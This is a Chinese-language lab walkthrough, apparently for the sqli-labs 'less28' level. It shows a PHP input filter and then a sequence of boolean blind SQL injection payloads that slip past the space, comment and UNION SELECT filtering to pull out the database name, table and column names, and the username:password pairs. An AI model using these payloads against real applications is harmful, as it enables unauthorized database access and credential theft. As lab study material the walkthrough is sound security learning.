---
title: less28
url: https://www.yuque.com/u29002979/ep2zrx/gmnoli0o1lorc6m3
---

```bash
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";

$id= preg_replace('/[\/*]/',"", $id);				//strip out /*
$id= preg_replace('/[--]/',"", $id);				//Strip out --.
$id= preg_replace('/[#]/',"", $id);					//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.

//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out UNION & SELECT.
```

**union 和 select** **的组合**被过滤了。

> All Your'UNION'and'SIETICT' belong to us.

提示union和select被过滤。

`1'` 现没有报错回显 &#x20;
`1')and'1'=('1`成功闭合
没有报错回显，就使用布尔盲注 <a name="EfVmh"></a>

# 布尔盲注

经过测试发现单独输入select和union时候，不会被过滤掉

```bash
判断库长
1')and(length(database())=8)||'1'=('1
返回正常,数据库长度为8

逐一字符判断数据库名称
1')and(ascii(substr((database()),1,1))=115)||'1'=('1
返回正常,s
...

判断数据表长度
1')and(length((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))=29)||'1'=('1
正常回显数据表串起来长为29
...

逐一字符判断数据表名称
1')and(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))=101)||'1'=('1
正常回显,e
...

判断列长
1')and(length((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='users')))=20)||'1'=('1
正常回显,列长串起来是为20
...

逐一字符判断字段名称
1')and(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='users')),1,1))=105)||'1'=('1
正常回显,i
...

逐一字符判断字段内容
1')and(ascii(substr((select(group_concat(username,0x7e,password))from(users)),1,1))=68)||'1'=('1
显示正常,D
...
```
